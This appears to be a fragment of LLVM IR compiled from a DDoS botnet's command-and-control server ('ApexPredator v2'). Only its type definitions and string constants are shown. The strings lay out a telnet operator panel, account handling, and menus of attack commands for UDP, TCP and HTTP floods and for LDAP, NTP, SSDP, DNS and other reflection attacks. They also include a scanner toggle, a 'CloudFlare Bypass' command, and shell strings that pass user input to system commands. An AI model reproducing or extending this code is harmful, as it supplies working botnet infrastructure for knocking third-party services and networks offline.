; ModuleID = 'host/ir_O0/Apex_Predator.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], i8 }
%struct.telnetdata_t = type { i32, i32 }
%struct.account = type { [20 x i8], [20 x i8], [20 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.1 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.5 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.219 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.8 = private unnamed_addr constant [64 x i8] c"%c]0; ApexPredator v2 | IoT Devices: %d | Apex Predators: %d %c\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"apex.txt\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.11 = private unnamed_addr constant [36 x i8] c"\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\0A\00", align 1
@.str.12 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.13 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.14 = private unnamed_addr constant [36 x i8] c"\0A\1B[1;37m[\1B[0;36m%d.%d.%d.%d\1B[1;37m]\00", align 1
@.str.15 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.16 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.17 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.18 = private unnamed_addr constant [32 x i8] c"\1B[0;31mUsername\1B[1;37m: \1B[1;37m\00", align 1
@.str.20 = private unnamed_addr constant [32 x i8] c"\1B[0;31mPassword\1B[1;37m: \1B[1;37m\00", align 1
@.str.21 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.22 = private unnamed_addr constant [23 x i8] c"Login Attempt Saved.\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [56 x i8] c"Please contact the owner if you run into this issue!!\0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.25 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [49 x i8] c"\1B[1;37m              Welome to the \1B[1;31mApex\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [71 x i8] c"\1B[1;37m  A place where all the \1B[1;31mApex Predators\1B[1;37m hang out\0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [56 x i8] c"\1B[1;37m              Version 2 [\1B[1;31mcustom\1B[1;37m]\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [28 x i8] c"\1B[1;31mApexPredator\1B[1;37m#\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.32 = private unnamed_addr constant [8 x i8] c"devices\00", align 1
@.str.33 = private unnamed_addr constant [8 x i8] c"DEVICES\00", align 1
@.str.34 = private unnamed_addr constant [141 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36mssh\1B[1;37m] - \1B[1;31m %d \0D\0A\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m.\1B[1;36musers\1B[1;37m] - \1B[1;31m %d \0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"Help\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]All Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.39 = private unnamed_addr constant [84 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]---------------------------------------------------------\0D\0A\00", align 1
@.str.40 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;31mClear Screen\1B[1;37m]         CLEAR\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mLOGOUT\1B[1;37m]               LOGOUT\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;33mUsable Ports\1B[1;37m]         PORTS\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;34mRules\1B[1;37m]                RULES\0D\0A\00", align 1
@.str.44 = private unnamed_addr constant [52 x i8] c"\1B[1;37m[\1B[1;36mSpoofing Methods\1B[1;37m]     SPOOF\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [54 x i8] c"\1B[1;37m[\1B[1;31mSpecial Commands\1B[1;37m]     SPECIAL\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;32mScanning Commands\1B[1;37m]    REAPER\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [53 x i8] c"\1B[1;37m[\1B[1;33mStressing Commands\1B[1;37m]   STRESS\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [7 x i8] c"STRESS\00", align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"stress\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ddos\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"DDOS\00", align 1
@.str.52 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Method Listings\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 UDP\1B[1;37m]               L4UDP  \0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [58 x i8] c"\1B[1;37m[\1B[1;31mLayer4 TCP\1B[1;37m]               L4TCP  \0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [60 x i8] c"\1B[1;37m[\1B[1;31mLayer4 Spoofing\1B[1;37m]          L4SPOOF  \0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [55 x i8] c"\1B[1;37m[\1B[1;31mLayer7\1B[1;37m]                   L7  \0D\0A\00", align 1
@.str.57 = private unnamed_addr constant [6 x i8] c"L4UDP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"l4udp\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"l4UDP\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"L4udp\00", align 1
@.str.61 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 UDP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.62 = private unnamed_addr constant [114 x i8] c"\1B[1;37m[\1B[1;31mUDP Flood\1B[1;37m]    !* UDP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 0 1\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mSTD Flood\1B[1;37m]    !* STD  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mHOLD Flood\1B[1;37m]   !* HOLD [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [107 x i8] c"\1B[1;37m[\1B[1;31mJUNK Flood\1B[1;37m]   !* JUNK [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mCNC Flood\1B[1;37m]    !* CNC  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mADMIN PORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"L4TCP\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"l4tcp\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"l4TCP\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"L4tcp\00", align 1
@.str.71 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 4 TCP Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ALL Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ALL 0 1\0D\0A\00", align 1
@.str.73 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-SYN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 SYN 0 1\0D\0A\00", align 1
@.str.74 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-FIN Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 FIN 0 1\0D\0A\00", align 1
@.str.75 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-RST Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 RST 0 1\0D\0A\00", align 1
@.str.76 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PSH Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PSH 0 1\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-CRI Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 CRI 0 1\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-PRO Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 PRO 0 1\0D\0A\00", align 1
@.str.79 = private unnamed_addr constant [119 x i8] c"\1B[1;37m[\1B[1;31mTCP-ACK Flood\1B[1;37m]  !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 ACK 0 1\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [120 x i8] c"\1B[1;37m[\1B[1;31mTCP-XMAS Flood\1B[1;37m] !* TCP [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m] 32 XMAS 0 1\0D\0A\00", align 1
@.str.81 = private unnamed_addr constant [3 x i8] c"L7\00", align 1
@.str.82 = private unnamed_addr constant [3 x i8] c"l7\00", align 1
@.str.83 = private unnamed_addr constant [7 x i8] c"layer7\00", align 1
@.str.84 = private unnamed_addr constant [7 x i8] c"Layer7\00", align 1
@.str.85 = private unnamed_addr constant [7 x i8] c"LAYER7\00", align 1
@.str.86 = private unnamed_addr constant [79 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m] Layer 7 Method Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mHTTP Flood\1B[1;37m]   !* HTTP  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [88 x i8] c"\1B[1;37m[\1B[1;31mWGET Flood\1B[1;37m]   !* WGET  [\1B[1;31mURL\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"L4SPOOF\00", align 1
@.str.90 = private unnamed_addr constant [8 x i8] c"l4spoof\00", align 1
@.str.91 = private unnamed_addr constant [8 x i8] c"l4SPOOF\00", align 1
@.str.92 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Spoofing Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.93 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mLDAP Flood\1B[1;37m]     !* LDAP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mNTP Flood\1B[1;37m]      !* NTP      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.95 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSSDP Flood\1B[1;37m]     !* SSDP     [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;34mDNS Flood\1B[1;37m]      !* DNS      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;35mREAPER Flood\1B[1;37m]   !* REAPER   [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;36mMSSQL Flood\1B[1;37m]    !* MSSQL    [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.99 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP Flood\1B[1;37m]  !* PORTMAP  [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.100 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;32mTS3 Flood\1B[1;37m]      !* TS3      [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [113 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL Flood\1B[1;37m] !* SENTINEL [\1B[1;31mIP\1B[1;37m] [\1B[1;31mPORT\1B[1;37m] [\1B[1;31mTIME\1B[1;37m]\0D\0A\00", align 1
@.str.102 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Reflection Listing\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;31mLDAP\1B[1;37m]:\1B[1;31m 0 \0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mNTP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [40 x i8] c"\1B[1;37m[\1B[1;33mSSDP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.106 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;34mDNS\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.107 = private unnamed_addr constant [42 x i8] c"\1B[1;37m[\1B[1;35mREAPER\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.108 = private unnamed_addr constant [41 x i8] c"\1B[1;37m[\1B[1;36mMSSQL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.109 = private unnamed_addr constant [43 x i8] c"\1B[1;37m[\1B[1;31mPORTMAP\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.110 = private unnamed_addr constant [39 x i8] c"\1B[1;37m[\1B[1;32mTS3\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.111 = private unnamed_addr constant [44 x i8] c"\1B[1;37m[\1B[1;33mSENTINEL\1B[1;37m]:\1B[1;31m 0\0D\0A\00", align 1
@.str.112 = private unnamed_addr constant [8 x i8] c"SPECIAL\00", align 1
@.str.113 = private unnamed_addr constant [6 x i8] c"ADMIN\00", align 1
@.str.114 = private unnamed_addr constant [6 x i8] c"Admin\00", align 1
@.str.115 = private unnamed_addr constant [8 x i8] c"special\00", align 1
@.str.116 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31m+\1B[1;37m]Special Commands\1B[1;37m[\1B[1;31m+\1B[1;37m]     \0D\0A\00", align 1
@.str.117 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mAdds User\1B[1;37m]         root_add  [\1B[1;31mUSER\1B[1;37m] [\1B[1;31mPASS\1B[1;37m]\0D\0A\00", align 1
@.str.118 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;32mIP Geolocation\1B[1;37m]    root_geo  [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.119 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;33mSubDomain Scanner\1B[1;37m] root_sub  [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.120 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;34mPort Scanner\1B[1;37m]      root_scan [\1B[1;31mIP\1B[1;37m]\0D\0A\00", align 1
@.str.121 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;35mCloudFlare Bypass\1B[1;37m] root_cf   [\1B[1;31mURL\1B[1;37m]\0D\0A\00", align 1
@.str.122 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.123 = private unnamed_addr constant [77 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Logged Out!\0A\00", align 1
@.str.124 = private unnamed_addr constant [11 x i8] c"LOGOUT.log\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"logout\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"MOVE\00", align 1
@.str.127 = private unnamed_addr constant [5 x i8] c"move\00", align 1
@.str.128 = private unnamed_addr constant [95 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User:[\1B[0;36m%s\1B[1;37m] Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.129 = private unnamed_addr constant [10 x i8] c"SHELL.log\00", align 1
@.str.130 = private unnamed_addr constant [94 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] User: \1B[0;36m%s\1B[1;37m Has Attempted To Shell Your Bots!\0A\00", align 1
@.str.131 = private unnamed_addr constant [8 x i8] c"!* STOP\00", align 1
@.str.132 = private unnamed_addr constant [12 x i8] c"!* KILLATTK\00", align 1
@.str.133 = private unnamed_addr constant [25 x i8] c"[Reaper] Attack Stopped!\00", align 1
@.str.134 = private unnamed_addr constant [7 x i8] c"!* UDP\00", align 1
@.str.135 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mUDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.136 = private unnamed_addr constant [7 x i8] c"!* STD\00", align 1
@.str.137 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSTD \1B[1;37mFlood!\0D\0A\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.139 = private unnamed_addr constant [8 x i8] c"RESOLVE\00", align 1
@.str.140 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.141 = private unnamed_addr constant [66 x i8] c"Resolved \1B[1;37m[\1B[0;31m%s\1B[1;37m] to \1B[1;37m[\1B[0;31m%s\1B[1;37m]\0D\0A\00", align 1
@.str.142 = private unnamed_addr constant [60 x i8] c"\1B[1;37mYou Dont Have Permission To Use This\1B[0;31m!\1B[1;37\0D\0A\00", align 1
@.str.143 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"ADDUSER\00", align 1
@.str.145 = private unnamed_addr constant [22 x i8] c"echo '%s' >> apex.txt\00", align 1
@.str.146 = private unnamed_addr constant [90 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0A\00", align 1
@.str.147 = private unnamed_addr constant [91 x i8] c"\1B[1;37m[\1B[1;31mApex\1B[1;37m] \1B[1;37mUser:[\1B[0;36m%s\1B[1;37m] Added User:[\1B[0;36m%s\1B[1;37m]\0D\0A\00", align 1
@.str.148 = private unnamed_addr constant [7 x i8] c"!* CNC\00", align 1
@.str.149 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mCNC \1B[1;37mFlood!\0D\0A\00", align 1
@.str.150 = private unnamed_addr constant [8 x i8] c"!* HTTP\00", align 1
@.str.151 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mHTTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.152 = private unnamed_addr constant [8 x i8] c"!* JUNK\00", align 1
@.str.153 = private unnamed_addr constant [8 x i8] c"!* HOLD\00", align 1
@.str.154 = private unnamed_addr constant [7 x i8] c"!* TCP\00", align 1
@.str.155 = private unnamed_addr constant [57 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Loading sockets...\0D\0A\00", align 1
@.str.156 = private unnamed_addr constant [8 x i8] c"!* WGET\00", align 1
@.str.157 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mWGET \1B[1;37mFlood!\0D\0A\00", align 1
@.str.158 = private unnamed_addr constant [5 x i8] c"XMAS\00", align 1
@.str.159 = private unnamed_addr constant [124 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mT\1B[1;32mC\1B[1;33mP\1B[1;34m-\1B[1;35mX\1B[1;36mM\1B[1;31mA\1B[1;32mS \1B[1;37mFlood\0D\0A\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.161 = private unnamed_addr constant [103 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTCP \1B[1;37mFlood using \1B[1;31mALL \1B[1;37mMethods!\0D\0A\00", align 1
@.str.162 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.163 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-SYN \1B[1;37mFlood\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.165 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-FIN \1B[1;37mFlood\0D\0A\00", align 1
@.str.166 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.167 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-RST \1B[1;37mFlood\0D\0A\00", align 1
@.str.168 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.169 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-ACK \1B[1;37mFlood\0D\0A\00", align 1
@.str.170 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.171 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PSH \1B[1;37mFlood\0D\0A\00", align 1
@.str.172 = private unnamed_addr constant [4 x i8] c"PRO\00", align 1
@.str.173 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-PRO \1B[1;37mFlood\0D\0A\00", align 1
@.str.174 = private unnamed_addr constant [4 x i8] c"CRI\00", align 1
@.str.175 = private unnamed_addr constant [74 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[0;36mTCP-CRI \1B[1;37mFlood\0D\0A\00", align 1
@.str.176 = private unnamed_addr constant [5 x i8] c"ldap\00", align 1
@.str.177 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.178 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.179 = private unnamed_addr constant [70 x i8] c"[ApexPredator] Sending LDAP Attack to %s On Port %s For %s Seconds! \0A\00", align 1
@.str.180 = private unnamed_addr constant [10 x i8] c"root_ssdp\00", align 1
@.str.181 = private unnamed_addr constant [72 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSSDP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.182 = private unnamed_addr constant [9 x i8] c"root_ntp\00", align 1
@.str.183 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mNTP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.184 = private unnamed_addr constant [14 x i8] c"root_sentinel\00", align 1
@.str.185 = private unnamed_addr constant [76 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mSENTINEL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.186 = private unnamed_addr constant [9 x i8] c"root_dns\00", align 1
@.str.187 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mDNS \1B[1;37mFlood!\0D\0A\00", align 1
@.str.188 = private unnamed_addr constant [12 x i8] c"root_reaper\00", align 1
@.str.189 = private unnamed_addr constant [80 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mApexPredator \1B[1;37mFlood!\0D\0A\00", align 1
@.str.190 = private unnamed_addr constant [11 x i8] c"root_mssql\00", align 1
@.str.191 = private unnamed_addr constant [73 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mMSSQL \1B[1;37mFlood!\0D\0A\00", align 1
@.str.192 = private unnamed_addr constant [13 x i8] c"root_portmap\00", align 1
@.str.193 = private unnamed_addr constant [75 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mPORTMAP \1B[1;37mFlood!\0D\0A\00", align 1
@.str.194 = private unnamed_addr constant [9 x i8] c"root_ts3\00", align 1
@.str.195 = private unnamed_addr constant [71 x i8] c"\1B[1;37m[\1B[1;31mApexPredator\1B[1;37m] Sending \1B[1;31mTS3 \1B[1;37mFlood!\0D\0A\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"!* SCANNER ON\00", align 1
